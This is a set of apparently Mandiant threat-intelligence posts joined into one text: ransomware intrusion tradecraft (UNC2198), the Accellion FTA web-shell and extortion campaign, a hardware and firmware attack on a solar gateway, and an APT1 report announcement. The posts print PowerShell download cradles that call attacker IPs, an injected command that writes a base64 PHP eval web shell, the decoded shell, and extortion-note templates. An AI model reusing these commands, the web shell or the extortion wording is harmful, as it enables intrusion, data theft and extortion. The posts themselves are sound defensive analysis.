C:\\ProgramData\\S\\u0443sH\\u0435\\u0430ls\\T\\u0430s\\u0441host.exe Unicode Unescaped C:\\ProgramData\\SуsHеаls\\Tаsсhost.exe The executable was then executed by using a Scheduled Task named shadowdev : cmd.exe /c schtasks /create /sc minute /mo 1 /tn shadowdev /tr C:\\\\ProgramData\\\\S\\u0443sH\\u0435\\u0430ls\\\\T\\u0430s\\u0441host.exe While the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download cradles to execute Base64-encoded and compressed BEACON stagers in memory: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth')) powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"hxxp://185.106.122[.]167:80/a\")) powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))\" Discovery and Reconnaissance UNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities. UNC2198 has used the BloodHound active directory mapping utility during intrusions from within the “ C:\\ProgramData ” and “ C:\\Temp ” directories. The following are collective examples of various commands executed by UNC2198 over time to enumerate a compromised environment: arp -a whoami /groups whoami.exe  /groups /fo csv whoami /all net user < Redacted > net groups \"Domain Admins\" /domain net group \"Enterprise admins\" /domain net group \"local admins\" /domain net localgroup \"administrators\" /domain nltest /domain_trusts nltest /dclist:< Redacted > Lateral Movement and Privilege Escalation UNC2198 has used Windows Remote Management and RDP to move laterally between systems. UNC2198 has also performed remote execution of BEACON service binaries on targeted systems to move laterally. UNC2198 launches SMB BEACON using PowerShell, executing command lines such as the following: C:\\WINDOWS\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB bAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AH MASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...< Truncated > During one intrusion, UNC2198 used the SOURBITS privilege escalation utility to execute files on a target system. SOURBITS is a packaged exploit utility for CVE-2020-0787 , which is a vulnerability that was disclosed in 2020 for Windows Background Intelligent Transfer Service (BITS) . SOURBITS consists of code derived from a GitHub Repository that is implemented as a command-line utility, which can execute arbitrary files with elevated privileges. UNC2198 used SOURBITS with the following components: C:\\Users\\<User>\\Downloads\\runsysO.cr C:\\Users\\<User>\\Downloads\\starterO.exe The file runsysO.cr is an XOR-encoded PE executable that exploits CVE-2020-0787, and based on the target system's bitness, it will drop one of two embedded SOURBITS payloads. Data Theft, Ransomware Deployment and #TTR Like other financially motivated threat actors, part of UNC2198’s modus operandi in latter stages of intrusions involves the exfiltration of hundreds of gigabytes of the victim organizations’ data before ransomware is installed. Specifically, UNC2198 has used RCLONE, a command line utility used to synchronize cloud storage, to aid in the exfiltration of sensitive data. In all observed cases of data theft, RCLONE was used by UNC2198 from the “ C:\\PerfLogs\\rclone.exe ” file path. “ Time-to-Ransom \" (TTR) is the delta between first-attributed access time and the time of ransomware deployment. TTR serves as a useful gauge of how quickly an organization needs to respond to stave off a threat actor’s successful deployment of ransomware. TTR is not a perfect quantification, as external factors such as an organization’s security posture can drastically affect the measurement. In this post, the TTR of UNC2198 is measured between ICEDID activity to the deployment of ransomware. In July 2020, UNC2198 deployed MAZE ransomware using PSEXEC, and the TTR was 5.5 days. In October 2020, UNC2198 deployed EGREGOR ransomware using forced GPO updates, and the TTR was 1.5 days. Looking Forward Threat actors leveraging access obtained through mass malware campaigns to deploy ransomware is a growing trend. The efficiency of ransomware groups places a significant burden on defenders to rapidly respond before ransomware deployment. As ransomware groups continue to gain operational expertise through successful compromises, they will continue to shorten their TTR while scaling their operations. Understanding the TTPs fundamental to a specific operation like UNC2198 provides an edge to defenders in their response efforts. Our unparalleled understanding of groups like UNC2198 is translated into Mandiant Advantage . Accessing our holdings in Mandiant Advantage aids defenders in recognizing TTPs used by threat actors, assessing organizational risk, and taking action. Initial investments made into rapidly assessing a group’s modus operandi pays dividends when they inevitably evolve and swap out components of their toolset. Whether it be MAZE or EGREGOR, something icy or hot, Advanced Practices will continue to pursue these unchill threat actors.

Appendix: Malware Families PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake image file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control (C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2 with a number of non-malicious domains. The non-malicious domains are contacted in addition to the real C2. WINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins and accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a reverse shell, loading new plugins, downloading and executing files, and modifying configuration settings. SYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote hosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via HTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a “ socks5 backconnect system” . The malware is typically used to hide the malicious traffic associated with other malware.

                "text": "Starting in mid-December 2020, malicious actors that Mandiant tracks as UNC2546 exploited multiple zero-day vulnerabilities in Accellion’s legacy File Transfer Appliance (FTA) to install a newly discovered web shell named DEWMODE. The motivation of UNC2546 was not immediately apparent, but starting in late January 2021, several organizations that had been impacted by UNC2546 in the prior month began receiving extortion emails from actors threatening to publish stolen data on the “CL0P^_- LEAKS\" .onion website. Some of the published victim data appears to have been stolen using the DEWMODE web shell. Notably, the number of victims on the “CL0P^_- LEAKS\" shaming website has increased in February 2021 with organizations in the United States, Singapore, Canada, and the Netherlands recently outed by these threat actors. Mandiant has previously reported that FIN11 has threatened to post stolen victim data on this same .onion site as an additional tactic to pressure victims into paying extortion demands following the deployment of CLOP ransomware. However, in recent CLOP extortion incidents, no ransomware was deployed nor were the other hallmarks of FIN11 present. We are currently tracking the exploitation of the zero-day Accellion FTA vulnerabilities and data theft from companies running the legacy FTA product as UNC2546, and the subsequent extortion activity as UNC2582. We have identified overlaps between UNC2582, UNC2546, and prior FIN11 operations, and we will continue to evaluate the relationships between these clusters of activity. For more information on our use of ‘UNC’ designations, see our blog post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" Mandiant has been working closely with Accellion in response to these matters and will be producing a complete security assessment report in the coming weeks. At this time, Accellion has patched all FTA vulnerabilities known to be exploited by the threat actors and has added new monitoring and alerting capabilities to flag anomalies associated with these attack vectors. Mandiant has validated these patches. Mandiant is currently performing penetration testing and code review of the current version of the Accellion FTA product and has not found any other critical vulnerabilities in the FTA product based on our analysis to date. Accellion customers using the FTA legacy product were the targets of the attack. Accellion FTA is a 20-year-old product nearing end of life. Accellion strongly recommends that FTA customers migrate to kiteworks , Accellion’s enterprise content firewall platform. Per Accellion, Kiteworks is built on an entirely different code base. The following CVEs have since been reserved for tracking the recently patched Accellion FTA vulnerabilities: CVE-2021-27101 - SQL injection via a crafted Host header CVE-2021-27102 - OS command execution via a local web service call CVE-2021-27103 - SSRF via a crafted POST request CVE-2021-27104 - OS command execution via a crafted POST request UNC2546 and DEWMODE In mid-December 2020, Mandiant responded to multiple incidents in which a web shell we call DEWMODE was used to exfiltrate data from Accellion FTA devices. The Accellion FTA device is a purpose-built application designed to allow an enterprise to securely transfer large files. The exfiltration activity has affected entities in a wide range of sectors and countries. Across these incidents, Mandiant observed common infrastructure usage and TTPs, including exploitation of FTA devices to deploy the DEWMODE web shell. Mandiant determined that a common threat actor we now track as UNC2546 was responsible for this activity. While complete details of the vulnerabilities leveraged to install DEWMODE are still being analyzed, evidence from multiple client investigations has shown multiple commonalities in UNC2546's activities. Evidence of Exploitation and DEWMODE Installation Mandiant has been able reconstruct many of the details about how Accellion FTAs have been compromised through examination of Apache and system logs from impacted devices—from initial compromise, to deployment of DEWMODE, and follow-on interaction. The earliest identification of activity associated with this campaign occurred in mid-December 2020. At this time, Mandiant identified UNC2546 leveraging an SQL injection vulnerability in the Accellion FTA. This SQL injection served as the primary intrusion vector. Mandiant observed evidence of SQL injection followed by subsequent requests to additional resources, as shown in Figure 1.

Immediately after this request, the built-in Accellion utility admin.pl was executed, resulting in an eval web shell being written to oauth.api . PWD=/home/seos/courier ; USER=root ; COMMAND=/usr/local/bin/admin.pl --edit_user=F --mount_cifs=- V,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm FzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd XNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG VhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}/home/seos/courier/oauth.api);FUK;\",PASSWORD # \\\" --passwd=pop Figure 2: Excerpt from log showing creation of eval web shell The decoded contents are shown in Figure 3. <?php if(isset($_REQUEST['token'])) { eval(base64_decode($_REQUEST['token'])); } else if(isset($_REQUEST['username'])) { system($_REQUEST['username']); } else { header('Location: /'); } Figure 3: Decoded eval web shell Almost immediately following this sequence, the DEWMODE web shell is written to the system. The timing of these requests suggests that DEWMODE was delivered via the oauth.api web shell; however, the available evidence does not indicate the exact mechanism used to write DEWMODE to disk. Mandiant has identified the DEWMODE web shell in one of the following two locations: /home/seos/courier/about.html /home/httpd/html/about.html The DEWMODE web shell (Figure 4) extracts a list of available files from a MySQL database on the FTA and lists those files and corresponding metadata—file ID, path, filename, uploader, and recipient—on an HTML page. UNC2546 then uses the presented list to download files through the DEWMODE web shell. Download requests are captured in the FTA’s web logs, which will contain requests to the DEWMODE web shell with encrypted and encoded URL parameters, where dwn is the file path and fn is the requested file name (Figure 5). The encrypted file path and name values visible in web logs can be decrypted using key material obtained from the database used by the targeted FTA. Given the complex nature of this process, if your organization needs assistance reviewing relevant logs, please contact Mandiant or Accellion.

In a subset of incidents, Mandiant observed UNC2546 requesting a file named cache.js.gz (Figure 7). Based on temporal file access to the mysqldump utility and mysql data directories, the archive likely contained a dump of the database. With the exception of cache.js.gz , Mandiant has not observed UNC2546 acquiring files from Accellion appliances through any method besides DEWMODE.

While the actors’ motivations were not immediately clear, several weeks after delivery of the DEWMODE web shell, victims began to receive extortion emails from an actor claiming association with the CLOP ransomware team (Figure 8 and Figure 9). The actors threatened to publish data on the \"CL0P^_- LEAKS\" .onion shaming website, unless the victim paid an extortion fee. We are tracking the subsequent extortion activity under a separate threat cluster, UNC2582. Despite tracking the exploitation and extortion activity in separate threat clusters we have observed at least one case where an actor interacted with a DEWMODE web shell from a host that was used to send UNC2582-attributed extortion email. Hello! Your network has been hacked, a lot of valuable data stolen. <description of stolen data, including the total size of the compressed files> We are the CLOP ransomware team, you can google news and articles about us. We have a website where we publish news and stolen files from companies that have refused to cooperate. Here is his address http://[redacted].onion/ - use TOR browser or http://[redacted].onion.dog/ - mirror. We are visited by 20-30 thousand journalists, IT experts, hackers and competitors every day. We suggest that you contact us via chat within 24 hours to discuss the current situation. <victim-specific negotiation URL> - use TOR browser We don't want to hurt, our goal is money. We are also ready to provide any evidence of the presence of files with us. Figure 8: Extortion Note Template 1 This is the last warning! If you don’t get in touch today, tomorrow we will create a page with screenshots of your files (like the others on our site),  send messages to all the emails that we received from your files. Due to the fact that journalists and hackers visit our site, calls and questions will immediately begin, online publications will begin to publish information about the leak, you will be asked to comment. Do not let this happen, write to us in chat or email and we will discuss the situation! CHAT:  <victim-specific negotiation URL> EMAIL: unlock@support-box.com USE TOR BROWSER! Figure 9: Extortion Note Template 2 Based on observations at several engagements, UNC2582 appears to follow a pattern of escalation to pressure victims into paying extortion demands. Initial emails are sent from a free email account, likely unique per victim, to a seemingly limited distribution of addresses at the victim organization. If the victim does not respond in a timely manner, additional emails are sent to a much larger number of recipients from hundreds or thousands of different email accounts and using varied SMTP infrastructure. In at least one case, UNC2582 also sent emails  to partners of the victim organization that included links to the stolen data and negotiation chat. Monitoring of the CL0P^_- LEAKS shaming website has demonstrated that UNC2582 has followed through on threats to publish stolen data as several new victims have appeared on the site in recent weeks, including at least one organization that has publicly confirmed that their Accellion FTA device had been recently targeted. Key Overlaps With FIN11 UNC2582 (Extortion) and FIN11 Mandiant identified overlaps between UNC2582’s data theft extortion activity and prior FIN11 operations, including common email senders and the use of the CL0P^_- LEAKS shaming site. While FIN11 is known for deploying CLOP ransomware, we have previously observed the group conduct data theft extortion without ransomware deployment, similar to these cases. Some UNC2582 extortion emails observed in January 2021 were sent from IP addresses and/or email accounts used by FIN11 in multiple phishing campaigns between August and December 2020, including some of the last campaigns that were clearly attributable to the group. We have not observed FIN11 phishing activity in the new year. FIN11 has typically paused their phishing operations over the winter holidays and had several extended gaps in their operations. However, the timing of this current hiatus is also consistent with UNC2582’s data theft extortion activity. UNC2582 extortion emails contained a link to the CL0P^_- LEAKS website and/or a victim specific negotiation page. The linked websites were the same ones used to support historical CLOP operations, a series of ransomware and data theft extortion campaigns we suspect can be exclusively attributed to FIN11. UNC2546 (FTA Exploitation and DEWMODE) and FIN11 There are also limited overlaps between FIN11 and UNC2546. Many of the organizations compromised by UNC2546 were previously targeted by FIN11. An IP address that communicated with a DEWMODE web shell was in the \"Fortunix Networks L.P.\" netblock, a network frequently used by FIN11 to host download and FRIENDSPEAK command and control (C2) domains. Implications The overlaps between FIN11, UNC2546, and UNC2582 are compelling, but we continue to track these clusters separately while we evaluate the nature of their relationships. One of the specific challenges is that the scope of the overlaps with FIN11 is limited to the later stages of the attack life cycle. UNC2546 uses a different infection vector and foothold, and unlike FIN11, we have not observed the actors expanding their presence across impacted networks. We therefore have insufficient evidence to attribute the FTA exploitation, DEWMODE, or data theft extortion activity to FIN11. Using SQL injection to deploy DEWMODE or acquiring access to a DEWMODE shell from a separate threat actor would represent a significant shift in FIN11 TTPs, given the group has traditionally relied on phishing campaigns as its initial infection vector and we have not previously observed them use zero-day vulnerabilities.

                "text": "In 2019, Mandiant’s Red Team discovered a series of vulnerabilities present within Digi International’s ConnectPort X2e device, which allows for remote code execution as a privileged user. Specifically, Mandiant’s research focused on SolarCity’s (now owned by Tesla) rebranded ConnectPort X2e device, which is used in residential solar installations. Mandiant performs this type of work both for research purposes and in a professional capacity for their global clients. Mandiant collaborated with Digi International and SolarCity/Tesla to responsibly disclose the results of the research, resulting in the following two CVEs: Hardcoded Credentials (CVE-2020-9306, CVSS3.0: 8.8) Execution with Unnecessary Privileges (CVE-2020-12878, CVSS3.0: 8.4) Technical details can be found in Digi International’s 3.2.30.6 software release , and on FireEye’s Vulnerability Disclosures GitHub project ( FEYE-2020-0019 and FEYE-2020-0020 ). This two-part blog series will discuss our analysis at a high level, explore the novel techniques used to gain initial access to the ConnectPort X2e device, and share the technical details of the vulnerabilities discovered. Topics to be covered will include physical device inspection, debugging interface probing, chip-off techniques, firmware analysis, glitch attacks, and software exploitation. If you’re interested in continuing the story in Part Two, you can read it now . FAQ What devices are affected, and (potentially) how many devices are affected? The vulnerabilities described in this post affect ConnectPort X2e devices as well as the SolarCity rebranded variant. Other vendor devices may also be vulnerable. It is unclear how many ConnectPort X2e devices are deployed in the wild. How is the issue being addressed? Mandiant worked independently with Digi International and Tesla to remediate the vulnerabilities. Mandiant would like to thank Digi International and Tesla for their cooperation and dedication to improving the security of their products. How would an attacker exploit these vulnerabilities? An attacker with local network access (such as being connected to an individual’s home network via Ethernet) to a vulnerable X2e device can exploit CVE-2020-9306 and CVE-2020-12878 to gain privileged access to the device. Who discovered these vulnerabilities? Jake Valletta (@jake_valletta), Sam Sabetan (@samsabetan) More information such as videos and datasheets on Mandiant’s Embedded Device Assessments can be found here . Technical Analysis Device Overview Before diving into the details, we’ll discuss the ConnectPort X2e device (referred to as X2e device throughout the post) at a high level. The X2e device is a programmable gateway that connects to and collects data from ZigBee devices. It is commonly used as a Smart Energy gateway to interpret and send energy readings from a residential Solar Inverter. Vendors will often purchase an X2e device and configure it to read power consumption generated by a customer’s Solar Inverter. Figure 1 outlines a typical residential solar installation and highlights the X2e’s role. Figure 1: Typical X2e residential deployment For our research, we focused on the X2e device used by SolarCity, now Tesla, to retrieve data from residential solar installations. A typical setup would involve SolarCity providing a customer with a gateway that would be connected to the Internet via an Ethernet cable on the customer’s home network. Figure 2 shows one of the SolarCity branded X2e devices that we tested. Figure 2: X2e device Without even plugging in the X2e device, we know of at least two separate interfaces to explore: the Ethernet interface and the ZigBee radio. Note that we did not review the ZigBee interface between the X2e and a solar invertor, and that interface will not be covered in either Part One or Part Two of this series. Initial Analysis and Physical Inspection Network Reconnaissance We started our research by assessing the X2e device from a network perspective. By using nmap , we discovered that the device exposed both SSH and HTTP/HTTPS, shown in Figure 3. Figure 3: Port scan results from the X2e Upon accessing these services remotely, we noted that both services required authentication. We also performed limited brute force attempts, which were unsuccessful. Additionally, the underlying services were not vulnerable to any public exploits. With not many network-based leads to follow, we shifted our analysis to a hardware perspective to determine if any local attacks may be possible to gain initial access onto the device. Physical Board Inspection To begin our hardware analysis, we removed the plastic casing from the device and mapped out the various integrated circuit (IC) components and searched for potential debugging interfaces. Inventorying the components present on the circuit board (also known as a PCB) is a crucial step in understanding how the device was designed and what can be expected down the road. Figure 4 shows the mapped-out components as well as a cluster of pins that resembled a typical 3-pin universal asynchronous transmit/receive (UART) connection, a common debugging interface on embedded devices. Figure 4: X2e components and suspicious cluster of pins Without a remote connection to the X2e device, UART is an attractive target. UART typically provides the equivalent functionality of a service like SSH or Telnet and the added benefit of watching verbose output during system boot. To determine if the cluster of pins was a UART interface, we first soldered a 3-pin through-hole header to the PCB. Using a combination of continuity tests with a multimeter and the digital logic analyzer Saleae , it became apparent that we were in fact dealing with a UART interface. The Figure 5 shows the three pins (Ground, TX, RX) connected to the header. Attached to the other end of the three wires was a FTDI serial TTL-232 to USB adapter , which was connected to a Linux virtual machine. Figure 5: Connecting to potential UART interface In addition to correctly identifying the UART pins and a UART to USB adapter, we also needed software to read/write from the interface as well as knowledge of the baud rate. Baud rates vary but typically follow standard values, including 9600, 14400, 19200, 38400, 57600, and 115200. Using the python module pySerial , we connected to the USB adapter and tried standard baud rates until one of the rates produced readable ASCII output (an incorrect baud rate will typically produce non-readable output), and determined the X2e used a baud rate of 115200. Upon booting the X2e, we noted output from the BootROM, bootloader (which was Das U-Boot 2009.8, a common embedded bootloader), as well as output from the Linux kernel transmitted over the UART connection, shown in Figure 6. Figure 6: UART boot messages Many configurations of U-Boot allow a physically connected user (using an interface such as UART) the ability to interrupt the boot process; however, this configuration explicitly disabled that feature, shown in Figure 7. Figure 7: Uninterruptable U-Boot bootloader on the X2e Interrupting a bootloader is attractive to an attacker, as often the boot parameters passed to the Linux operating system can be manipulated to control how it will load, such as booting into single user mode (typically a recover shell) or mounting filesystems as read-write. In the case of the X2e, the UART connection was mapped to a Linux TTY which required username and password authentication, shown in Figure 8. Figure 8: User authentication to Linux over UART Without any ability to interrupt the boot process or credentials to authenticate to the X2e, we were faced with another dead end. We then shifted our analysis to obtaining the firmware stored on the X2e’s non-volatile storage. Chip Removal and Data Extraction In this section, we’ll cover the basics of non-volatile memory, often referred to as “flash memory”, present on embedded devices as well as the process used to extract content from the chip. As mentioned, taking inventory of the components on the PCB is an important first step. Figure 9 shows the suspected flash chip present on the PCB magnified under a digital microscope. Figure 9: Closeup of Spansion flash The visible markings seen in Figure 9 are important as they allow us to determine the manufacturer and model of the flash, which will assist us with obtaining the datasheet for the chip. In our case, the NAND we were dealing with was a Spansion S34ML01G1, and its datasheet could be found here . NAND Overview Before we talk about acquiring the firmware from the NAND chip, it’s important to first understand the various scenarios that embedded devices typically follow. NAND verses NOR : These fundamentally different technologies each have their own benefits and drawbacks. NAND is cheap but suffers from high probability of “bad blocks,” or areas that are corrupt sometimes directly from the factory. As such, protections and considerations need to be present to be able to protect against this. NAND is also much faster to erase and write, making it ideal for storing file systems, kernels, and other pieces of code that may need to be reset or changed. NOR has significantly faster read times but is not as flexible with accessing data and has low erase and write speeds. NOR is usually used for low-level bootloaders, hardcoded firmware blobs, and other areas that are not expected to change frequently. The X2e uses a NAND flash. Serial verses Parallel : This refers to how the data is accessed and is typically visually identifiable. If there are a large number of pins, the flash is likely parallel. Serial NOR chips can be small in size and typically need eight or fewer pins to function. Common serial interfaces are Serial Peripheral Interface (SPI) or Inter-Integrated Circuit (I2C), while a common parallel interface for NAND is Open NAND Flash Interface (ONFI2.0, ONFI3.0). The X2e is a parallel flash. IC Form Factor : Another visually identifiable trait—form factor (or “package”)—refers to how the chip is attached to the PCB. There is a long list of options here , but common surface-mount flash packages include small outline package (SOP), thin outline small package (TOSP), or a variant of ball grid array (*BGA). The key distinction here is SOP and TOSP expose the pins, while BGA conceals the pins under the package. The X2e is BGA63, also referred to as a 63-pin BGA package. Managed verses Unmanaged Flash : This one is more applicable to NAND, for reasons alluded to in the NAND verses NOR section. As stated, NAND needs help to manage the integrity of the data. With unmanaged NAND, the IC reserves sections of the flash (often called “spare” area) for someone else to manage the data. This is typically implemented as either a kernel driver or an external NAND controller. Managed NAND means that the IC package includes the controller and transparently manages the data. This is extremely common in embedded devices, as either embedded MMC (eMMC) or universal flash storage (UFS). The X2e uses unmanaged flash and is controlled by the main microcontroller present on the PCB. With the basics out of the way, we proceeded with physically removing the chip from the PCB. Chip Removal Physical chip removal is considered a destructive approach but can certainly be performed without damaging the PCB or the flash chip itself. When presented with removal of BGA packages, the two most common removal techniques are either hot air or infrared light (IR). Commercial solutions exist for both hot air and IR, but cheaper options exist with hot air removal. We opted to use hot air on the X2e. To minimize damage to the PCB and flash, a PCB heater or oven can be used to slowly bring the entire PCB to a temperature right below the solder melting point. This will reduce the amount of time we need to focus our hot air directly onto the flash IC and help with reducing the heat dissipation into the PCB throughout the process. One final trick that can be used to minimize nearby chips from being damaged or lost (due to the air pressure) is the use of high-heat resistant tape, commonly referred to as Kapton tape. Figure 10 shows the PCB wrapped in Kapton tape to protect nearby components. Figure 10: High-heat resistant tape on PCB Figure 11 shows an example setup with the X2e PCB inserted into a PCB heater, with a hot air gun suspended over the IC. Figure 11: Hot air rework/reflow station While using the hot air to warm the IC and surrounding areas, we gently nudged the flash to see if the solder had become molten. Once the chip appeared to be floating, we quickly removed the chip and let it cool for about 30 seconds. Figure 12 shows the IC flash removed from the PCB, with the solder still present on the BGA pads. Figure 12: NAND removed from X2e Before inserting the NAND into a clam-shell chip reader, the leftover solder must be removed from the flash. This can be accomplished using a soldering iron, high-quality flux, and de-soldering wick. Once removed, isopropyl alcohol and a toothbrush are highly effective at removing the leftover flux residue and cleaning the chip. In the next section, we’ll attempt to extract the data from the NAND chip using a multi-purpose chip programmer. Data Extraction With the cleaned flash chip in hand, we can now explore options for reading the raw contents. Commercial forensic acquisition devices exist, but a quick eBay or AliExpress search will produce a multitude of generic chip readers. One such device, the XGecu Pro , supports a variety of adapters and chipsets and connects to a Windows machine using USB. It also comes with software to interface with the XGecu Pro and can even auto-detect flash. To connect the Spansion NAND to the XGecu Pro, we also purchased a clamshell BGA63 adapter. Figure 13 shows the NAND inserted into the clamshell reader, and Figure 14 shows the clamshell adapter connected to the XGecu Pro device. Figure 13: Spansion NAND in BGA clamshell adapter Figure 14: NAND adapter connected to XGecu Using the XGecu Pro software, we can read the entire contents of the flash to a binary file for further analysis. Since these are not commercial solutions, it is a good idea to perform two or three reads and then diff the extraction to confirm the content was read without errors. Firmware Analysis Cleaning and Mounting With our fresh NAND dump in hand, the next step was to parse out any relevant firmware blobs, configurations, or filesystems. The go-to tool for starting this process is binwalk . binwalk does a fantastic job of detecting filesystems, bootloaders, and kernels. In addition, binwalk can calculate entropy (detecting packed or encrypted data) and identify assembly opcodes. Figure 15 shows partial output of running binwalk against the NAND dump. Figure 15: Initial binwalk scan against NAND dump We can see from the output that binwalk successfully identified what it believes are U-Boot uImage headers, Linux kernel images, and more than a dozen Journaling Flash File System version 2 (JFFS2) filesystems. JFFS2 is a common filesystem used in embedded devices; Unsorted Block Image File System (UBIFS) and SquashFS would also be common. At first glance, the output appears to be promising; however, it is highly unlikely that there are actually that many JFFS2 filesystems present on our NAND. Another indication that something isn’t quite right are the hexadecimal offsets – they don’t appear to be clean, uniform offsets. It is far more common that the offsets of the items identified by binwalk would align with NAND page offsets, which are a multiple of 2048. In order to understand what is occurring here, we need to revisit a characteristic of unmanaged (or “raw”) NAND ICs described in the NAND Overview section. To recap, raw NAND requires additional bytes per page for use by higher-level components to attest to the validity of the page, typically implemented as a defined “bad block” marker and a per-page (or subpage) Error-Correcting Code (ECC). Without going too deep into ECC fundamentals, ECC provides the ability for higher-level processes to detect n number of bad bits on a page and to correct m number of bits. Since our goal here is not to perform forensics on the raw NAND, our immediate objective is to remove any ECC bytes or other non-data related bytes from the NAND dump. The MCU is ultimately the system manipulating the raw NAND, so understanding how our MCU, which was an NXP iMX28 series MCU, manages NAND is critical to being able to perform this. Fortunately for us, this process has already been explored by the security community , and iMX parsing libraries exist to manipulate the raw NAND dump and remove existing extraneous data. Figure 16 shows the results of re-running binwalk on the output of the imx-nand-convert script. Figure 16: binwalk scan of fixed NAND dump This time, we see only one JFFS2 filesystem, at the very round offset of 0x880000 . Using the extraction ( -e ) feature of binwalk , we can now obtain parsed versions of the U-Boot bootloader, Linux kernel, and JFFS2 system. The final hurdle we need to overcome is mounting the extracted JFFS2 filesystem in a way that allows us to explore the contents. On Linux, the easiest way to perform this is to use the mtd , mtdblock , and nandsim kernel modules . The nandsim module simulates a given NAND device and uses the mtd and JFFS2 subsystems to parse and manage appropriately. The key piece of information that needs to be passed to the nandsim module is the ONFI chip identifier, which can be obtained from the NAND datasheet or by requesting the ID from the IC using a generic reader (like the XGecu Pro used in the Data Extraction section). A list of supported IDs is also provided by the mtd maintainers . Getting the parameters correct is a bit of luck and magic and may require you to compile your own version of the nandsim module; that process will not be covered in this post. Figure 17 shows the steps required to simulate the correct Spansion NAND and mount the JFFS2 filesystem in the form of a Makefile target. Figure 17: Makefile target to mount JFFS2 filesystem By running make mount-jffs2 , we can quickly prep and mount the JFFS2 filesystem and explore the contents as we would any filesystem. Accessing the Filesystem In the last section of this post, we’ll walk through our analysis of the JFFS2 filesystem. Remember that our end goal is to obtain a remotely exploitable bug that will permit privileged code execution. With that in mind, some areas of interest are running daemons/processes, system startup logic, and credentials for services listening on the network. The first stop was reviewing the /etc/shadow file to see if there were password hashes for the root user as well as other system users. A quick check of this file determined there was no password hash for the root user, which indicated we would not be able to authenticate using password authentication. We noticed that two other password hashes were present, for the addpd and python users, shown in Figure 18. Figure 18: Connects of /etc/shadow The addpd user had a weak default password but was unable to authenticate using remote methods, and we were ultimately unable to crack the python user’s hash using internal GPU-based servers. Additionally, we were interested in processes that are launched during system boot or post-boot. The directory /WEB/python/ contained a ZIP archive called _x2e.zip , which contained over 200 compiled Python scripts (PYC files), which were loaded on system boot. Using the decompiler uncompyle2 , we unpacked these files for review. One file that stood out by name was password_manager.pyc , a file used to reset the login password upon successful boot-up. The file contained five hardcoded and plaintext credentials that mapped to the python system user. These credentials could be used to access the web interface and SSH, shown in Figure 19. Mandiant confirmed different passwords were used for different versions and connectivity states. Mandiant reported this to SolarCity and was assigned the CVE number CVE-2020-9306. Figure 19: Hardcoded credentials in password_manager.pyc With the correct password, we were finally able to connect to the web and SSH ports on a running X2e, but unfortunately only as the less-privileged python system user. While this was a great start, it didn’t satisfy our final objective, which was to remotely compromise the X2e as a privileged user. In Part Two of this blog series, we will explore additional avenues to further compromise the X2e. Conclusion In Part One of this two-part blog series, we covered an overview of the X2e, our initial network-based reconnaissance, PCB inspection techniques, physical debugging interface probing, chip-off techniques, and firmware analysis. Using these methodologies, we were successfully able to remotely compromise the X2e device as a non-administrative user due to hardcoded credentials (CVE-2020-9306). In Part Two, we will re-investigate physical attacks against the X2e in the form of glitch attacks, re-explore the U-Boot bootloader, and finally demonstrate an attack to remotely compromise the X2e device as a privileged user.

                "text": "Today, The Mandiant® Intelligence Center™ released an unprecedented report exposing APT1's multi-year, enterprise-scale computer espionage campaign. APT1 is one of dozens of threat groups Mandiant tracks around the world and we consider it to be one of the most prolific in terms of the sheer quantity of information it has stolen. Highlights of the report include: Evidence linking APT1 to China's 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department (Military Cover Designator 61398). A timeline of APT1 economic espionage conducted since 2006 against 141 victims across multiple industries. APT1's modus operandi (tools, tactics, procedures) including a compilation of videos showing actual APT1 activity . The timeline and details of over 40 APT1 malware families. The timeline and details of APT1's extensive attack infrastructure. Mandiant is also releasing a digital appendix with more than 3,000 indicators to bolster defenses against APT1 operations. This appendix includes: Digital delivery of over 3,000 APT1 indicators, such as domain names, and MD5 hashes of malware. Thirteen (13) X.509 encryption certificates used by APT1. A set of APT1 Indicators of Compromise (IOCs) and detailed descriptions of over 40 malware families in APT1's arsenal of digital weapons. IOCs that can be used in conjunction with Redline ™, Mandiant's free host-based investigative tool, or with Mandiant Intelligent Response® (MIR) , Mandiant's commercial enterprise investigative tool. The scale and impact of APT1's operations compelled us to write this report. The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as a \"what if\" discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk of losing much of our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating from China, and we wanted to do our part to arm and prepare security professionals to combat the threat effectively. The issue of attribution has always been a missing link in the public's understanding of the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to 